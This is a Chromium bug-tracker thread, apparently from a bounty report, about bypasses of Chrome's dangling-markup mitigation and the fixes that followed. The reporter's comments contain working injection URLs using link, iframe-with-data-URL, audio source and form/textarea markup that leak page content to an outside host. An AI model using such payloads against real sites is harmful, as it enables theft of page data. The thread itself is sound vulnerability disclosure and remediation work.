# Page still eats the page until the next `'`

| Field | Value |
|-------|-------|
| **Issue ID** | [40088514](https://issues.chromium.org/issues/40088514) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>Media, Blink>SecurityFeature |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | s....@gmail.com |
| **Assignee** | an...@chromium.org |
| **Created** | 2017-07-27 |
| **Bounty** | $500.00 |

## Description

UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36

Steps to reproduce the problem:
1. Go to https://test.shhnjk.com/xssable.php?x=%3Clink%20rel=stylesheet%20href=%27https://shhnjk.com/?
2. Request sent to cross-origin.

What is the expected behavior?
According to https://bugs.chromium.org/p/chromium/issues/detail?id=680970, those attack which eats up page until the next `'` should be blocked. Indeed, https://test.shhnjk.com/xssable.php?x=%3Cimg%20src=%27https://shhnjk.com/? is blocked.

What went wrong?
Request successfully made with <link>. Am I missing something?

Did this work before? N/A 

Chrome version: 61  Channel: dev
OS Version: OS X 10.12.5
Flash Version:

## Timeline

### s....@gmail.com (2017-07-28)

Okay, I can leak data using image too.

https://test.shhnjk.com/xssable.php?x=%3Ciframe%20src=%27data:text/html,%3Cimg%20src=%22https://shhnjk.com/?

### mk...@chromium.org (2017-07-28)

The first bit is https://chromium-review.googlesource.com/c/571785/, which I need to get back to.

The "`<img>` in a `data:` frame" bit is clever! I'll have to think about that a bit, as we've already stripped newlines by the time we get to parsing the image. Persisting the flag from the `data:` URL is possible, but somewhat ugly.

[Monorail components: Blink>SecurityFeature]

### sh...@chromium.org (2017-07-28)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2017-07-28)

[Empty comment from Monorail migration]

### s....@gmail.com (2017-08-01)

I may be wrong, but img in data iframe is detected and warned as deprecate in M59, where it does not get warned and bypassed in M61. So I'm guessing that https://bugs.chromium.org/p/chromium/issues/detail?id=680970#c14 might be the reason because data got out of scope and hence allowed?

### aw...@chromium.org (2017-08-09)

Hi mkwst@ - have you had a chance to look at this?  Cheers!

### go...@chromium.org (2017-08-09)

[Bulk Edit]
URGENT - PTAL.
Your bug is labelled as M61 Stable ReleaseBlock, pls make sure to land the fix and get it merged into the release branch ASAP.

Know that this issue shouldn't block the release?  Remove the ReleaseBlock-Stable label.

Thank you.


### sh...@chromium.org (2017-08-11)

mkwst: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mk...@chromium.org (2017-08-11)

This is not a stable-blocker. It makes the dangling markup mitigations I landed significantly less useful than I thought they were, but it's not a vulnerability in and of itself, and shouldn't stop us from shipping 61 if we can't remitigate by then.

### bu...@chromium.org (2017-08-11)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/682b16cc3fd2316946670f25f38a9abba6827fe4

commit 682b16cc3fd2316946670f25f38a9abba6827fe4
Author: Mike West <mkwst@chromium.org>
Date: Fri Aug 11 14:27:38 2017

Apply dangling markup restrictions to `<link>`.

`preconnect`, `dns-prefetch`, and `prefetch` were all inadvertantly
bypassing the danging markup mitigations we landed for "actual" resource
requests. This patch resolves that oversight.

Bug: 680970, 695474, 749852
Change-Id: Ic2a262d062a92830b1869b3fb3183280156f3c0a
Reviewed-on: https://chromium-review.googlesource.com/571785
Commit-Queue: Mike West <mkwst@chromium.org>
Reviewed-by: Yoav Weiss <yoav@yoav.ws>
Cr-Commit-Position: refs/heads/master@{#493728}
[modify] https://crrev.com/682b16cc3fd2316946670f25f38a9abba6827fe4/chrome/test/data/webui/i18n_process_test.html
[add] https://crrev.com/682b16cc3fd2316946670f25f38a9abba6827fe4/third_party/WebKit/LayoutTests/http/tests/security/dangling-markup/link-prefetch-expected.txt
[add] https://crrev.com/682b16cc3fd2316946670f25f38a9abba6827fe4/third_party/WebKit/LayoutTests/http/tests/security/dangling-markup/link-prefetch.html
[modify] https://crrev.com/682b16cc3fd2316946670f25f38a9abba6827fe4/third_party/WebKit/Source/core/html/HTMLLinkElement.cpp
[modify] https://crrev.com/682b16cc3fd2316946670f25f38a9abba6827fe4/third_party/WebKit/Source/core/loader/LinkLoader.cpp


### sh...@chromium.org (2017-08-12)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mk...@chromium.org (2017-08-14)

Re-removing `ReleaseBlock-Stable`, lowering the priority in the hopes of it not being added back. :)

### sh...@chromium.org (2017-08-14)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@google.com (2017-08-14)

hi mkwst@ - how would feel about merging this to 61?

### sh...@chromium.org (2017-08-15)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### go...@chromium.org (2017-08-15)

[Bulk Edit]
URGENT - PTAL.
Your bug is labelled as Stable ReleaseBlock, pls make sure to land the fix and get it merged into the release branch ASAP. Thank you!

Know that this issue shouldn't block the release?  Remove the ReleaseBlock-Stable label or move to M62.


### go...@chromium.org (2017-08-15)

+awhalley@ (Security TPM)

### mk...@chromium.org (2017-08-17)

Ok, if y'all want to treat this as a stable blocker, so be it. I'm not going to keep removing the label. :)

The patch that landed in #10 addresses the initial report in #0. I'm happy to merge that back, awhalley@, if you'd like me to. It should be pretty straightforward.

For the cleverer bit in #1, I have a patch out for review at https://chromium-review.googlesource.com/c/616664. It's not terribly complicated, but needs more tests. We can talk about whether it makes sense to merge back once it lands.

### aw...@google.com (2017-08-17)

Ah, sheriffbot is a persistent label re-applier! 

Requesting merge for the fix in #10 - just wait for govind@ to apply the approved label.

And thanks for the update on #1 - sounds like a plan.


### sh...@chromium.org (2017-08-17)

This bug requires manual review: M61 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: amineer@(Android), cmasso@(iOS), ketakid@(ChromeOS), govind@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ke...@chromium.org (2017-08-17)

govind@ are you going to approve this one?

### go...@chromium.org (2017-08-17)

Approving merge to M61 branch 3163 based on https://crbug.com/chromium/749852#c19. Please merge ASAP. Thank you.

### bu...@chromium.org (2017-08-18)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/9aa51a5d91811c1009a9a1655ed8c935504e2f76

commit 9aa51a5d91811c1009a9a1655ed8c935504e2f76
Author: Mike West <mkwst@chromium.org>
Date: Fri Aug 18 07:23:34 2017

Apply dangling markup restrictions to `<link>`.

`preconnect`, `dns-prefetch`, and `prefetch` were all inadvertantly
bypassing the danging markup mitigations we landed for "actual" resource
requests. This patch resolves that oversight.

TBR=mkwst@chromium.org

(cherry picked from commit 682b16cc3fd2316946670f25f38a9abba6827fe4)

Bug: 680970, 695474, 749852
Change-Id: Ic2a262d062a92830b1869b3fb3183280156f3c0a
Reviewed-on: https://chromium-review.googlesource.com/571785
Commit-Queue: Mike West <mkwst@chromium.org>
Reviewed-by: Yoav Weiss <yoav@yoav.ws>
Cr-Original-Commit-Position: refs/heads/master@{#493728}
Reviewed-on: https://chromium-review.googlesource.com/620587
Reviewed-by: Mike West <mkwst@chromium.org>
Cr-Commit-Position: refs/branch-heads/3163@{#671}
Cr-Branched-From: ff259bab28b35d242e10186cd63af7ed404fae0d-refs/heads/master@{#488528}
[modify] https://crrev.com/9aa51a5d91811c1009a9a1655ed8c935504e2f76/chrome/test/data/webui/i18n_process_test.html
[add] https://crrev.com/9aa51a5d91811c1009a9a1655ed8c935504e2f76/third_party/WebKit/LayoutTests/http/tests/security/dangling-markup/link-prefetch-expected.txt
[add] https://crrev.com/9aa51a5d91811c1009a9a1655ed8c935504e2f76/third_party/WebKit/LayoutTests/http/tests/security/dangling-markup/link-prefetch.html
[modify] https://crrev.com/9aa51a5d91811c1009a9a1655ed8c935504e2f76/third_party/WebKit/Source/core/html/HTMLLinkElement.cpp
[modify] https://crrev.com/9aa51a5d91811c1009a9a1655ed8c935504e2f76/third_party/WebKit/Source/core/loader/LinkLoader.cpp


### sh...@chromium.org (2017-08-18)

Please mark security bugs as fixed as soon as the fix lands, and before requesting merges. This update is based on the merge- labels applied to this issue. Please reopen if this update was incorrect.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@google.com (2017-08-18)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-08-19)

[Empty comment from Monorail migration]

### bu...@chromium.org (2017-08-21)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/71d5b3a8bd92e6ce9ff33a21c43b76e0be94e6b4

commit 71d5b3a8bd92e6ce9ff33a21c43b76e0be94e6b4
Author: Mike West <mkwst@chromium.org>
Date: Mon Aug 21 23:47:44 2017

Stop stripping whitespace from `data:` URLs in //url.

Whitespace is stripped in `net::DataURL::Parse()`, so this should result
in no net change in behavior, and will allow us to properly treat URLs
embedded inside `data:` URLs as potentially dangling markup in some edge
cases that the original patches missed.

Bug: 749852
Change-Id: I1ae514fc609d370cf4dceae471dc4d831af0bfad
Reviewed-on: https://chromium-review.googlesource.com/616664
Reviewed-by: Evan Stade <estade@chromium.org>
Reviewed-by: Daniel Cheng <dcheng@chromium.org>
Commit-Queue: Mike West <mkwst@chromium.org>
Cr-Commit-Position: refs/heads/master@{#496123}
[modify] https://crrev.com/71d5b3a8bd92e6ce9ff33a21c43b76e0be94e6b4/chrome/browser/autofill/form_structure_browsertest.cc
[modify] https://crrev.com/71d5b3a8bd92e6ce9ff33a21c43b76e0be94e6b4/third_party/WebKit/LayoutTests/editing/pasteboard/dragstart-contains-default-content-expected.txt
[add] https://crrev.com/71d5b3a8bd92e6ce9ff33a21c43b76e0be94e6b4/third_party/WebKit/LayoutTests/external/wpt/fetch/security/dangling-markup-mitigation-data-url.tentative.sub.html
[modify] https://crrev.com/71d5b3a8bd92e6ce9ff33a21c43b76e0be94e6b4/third_party/WebKit/LayoutTests/external/wpt/fetch/security/dangling-markup-mitigation.tentative.html
[modify] https://crrev.com/71d5b3a8bd92e6ce9ff33a21c43b76e0be94e6b4/third_party/WebKit/LayoutTests/fast/files/null-origin-string-expected.txt
[modify] https://crrev.com/71d5b3a8bd92e6ce9ff33a21c43b76e0be94e6b4/third_party/WebKit/LayoutTests/http/tests/security/no-indexeddb-from-sandbox-expected.txt
[modify] https://crrev.com/71d5b3a8bd92e6ce9ff33a21c43b76e0be94e6b4/third_party/WebKit/LayoutTests/http/tests/security/no-popup-from-sandbox-expected.txt
[modify] https://crrev.com/71d5b3a8bd92e6ce9ff33a21c43b76e0be94e6b4/third_party/WebKit/LayoutTests/http/tests/security/no-popup-from-sandbox-top-expected.txt
[modify] https://crrev.com/71d5b3a8bd92e6ce9ff33a21c43b76e0be94e6b4/third_party/WebKit/LayoutTests/http/tests/security/popup-allowed-by-sandbox-when-allowed-expected.txt
[modify] https://crrev.com/71d5b3a8bd92e6ce9ff33a21c43b76e0be94e6b4/url/url_canon_etc.cc


### mk...@chromium.org (2017-08-22)

Unmarking this as "Fixed": sheriffbot is pretty aggressive. :( The patch we merged back only addressed https://crbug.com/chromium/749852#c0, not https://crbug.com/chromium/749852#c1.

s.h.h.n.j.k@: https://chromium.googlesource.com/chromium/src.git/+/71d5b3a8bd92e6ce9ff33a21c43b76e0be94e6b4 should mitigate https://crbug.com/chromium/749852#c1 by making it more difficult to bypass the block with nested `data:` contexts. Perhaps you'd be interested in poking at Canary sometime later in the week to see if there's low-hanging fruit left available after that patch? :)

awhalley@: I don't think it's worth blocking 61 on this patch; I'd prefer to let it ride down with M62 in case we need to make more changes. But if you agree with sheriffbot's persistent label application, and you'd like me to merge it back after it bakes in Canary for a bit, I'll do so. WDYT?

### s....@gmail.com (2017-08-22)

Okay, I will check when I have time next week.

### sh...@chromium.org (2017-08-22)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ca...@chromium.org (2017-08-23)

awhalley@, can you comment if this is M61 blocking, as per c#28?

### aw...@chromium.org (2017-08-24)

Removing release block label.

### s....@gmail.com (2017-08-24)

I was bit free,  so II tested. And here is a bypass.

https://test.shhnjk.com/xssable.php?x=%3Caudio%20controls%3E%3Csource%20src=%27https://shhnjk.com/?

And what about form with textarea? Is it in scope of this protection?

https://test.shhnjk.com/xssable.php?x=%3Cform%20action=https://shhnjk.com%3E%3Cinput%20type=submit%3E%3Ctextarea%20name=go%3E


I recommend you to test all http leaks Chrome has and make sure all of them (at least non-user interaction ones) are prevented.

https://github.com/cure53/HTTPLeaks/blob/master/leak.html

If you prevent all leaks mentioned above then I'm sure I can't bypass it anymore.

### mk...@chromium.org (2017-08-25)

> I was bit free,  so II tested. And here is a bypass.

Great! I'll dig into that. Looks like we're re-parsing the URL at https://cs.chromium.org/chromium/src/third_party/WebKit/Source/core/html/HTMLMediaElement.cpp?dr=CSs&sq=package:chromium&l=1222, which means we're losing the whitespace bit. I have no idea why we're reparsing the URL there. I'll poke at it, and look for similar patterns, I suppose.

> And what about form with textarea? Is it in scope of this protection?

No, this is just about explicit requests. I'm poking at unclosed `<textarea>` and `<select><option>` behind the experimental web platform features flag separately (see https://cs.chromium.org/chromium/src/third_party/WebKit/Source/core/html/HTMLFormElement.cpp?l=310).

### sh...@chromium.org (2017-10-18)

[Empty comment from Monorail migration]

### es...@chromium.org (2017-11-10)

[Empty comment from Monorail migration]

### pa...@chromium.org (2017-11-29)

Any progress on this one? Thanks.

[Monorail components: Blink>Media]

### sh...@chromium.org (2017-12-07)

[Empty comment from Monorail migration]

### s....@gmail.com (2018-01-02)

Any reward-top-panel possibility at this point? At lease my https://crbug.com/chromium/749852#c1 is fixed. 

### aw...@google.com (2018-01-20)

Hi s.h.h.n.j.k@ - it'll hit the reward flow once marked fixed.  I'll keep an eye on it in case it continues to languish.

### sh...@chromium.org (2018-01-25)

[Empty comment from Monorail migration]

### es...@chromium.org (2018-02-18)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-03-07)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-04-19)

[Empty comment from Monorail migration]

### s....@gmail.com (2018-04-29)

Hi, can I at least talk about the bug in https://crbug.com/chromium/749852#c1 which was already fixed?

### aw...@google.com (2018-04-30)

s.h.h.n.j.k@ - seems reasonable, Ok!

### s....@gmail.com (2018-04-30)

Great! Thanks!

### sh...@chromium.org (2018-05-30)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-07-25)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-09-05)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-10-17)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-12-05)

[Empty comment from Monorail migration]

### s....@gmail.com (2018-12-22)

Bypass on https://crbug.com/chromium/749852#c33 seems to be fixed! Could anyone close this case?

### aw...@google.com (2018-12-27)

Marking as fixed. Hi andypaicu@ - mind verifying there's nothing more to do here?

### na...@google.com (2019-01-07)

[Empty comment from Monorail migration]

### na...@google.com (2019-01-24)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### na...@google.com (2019-01-24)

Congrats! The Panel has decided to reward $500 for this report. 

### na...@google.com (2019-01-24)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-04-05)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-04)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-05)

[Empty comment from Monorail migration]

### yu...@google.com (2024-01-06)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-06)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-08)

This issue was migrated from crbug.com/chromium/749852?no_tracker_redirect=1

[Multiple monorail components: Blink>Media, Blink>SecurityFeature]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40088514)*
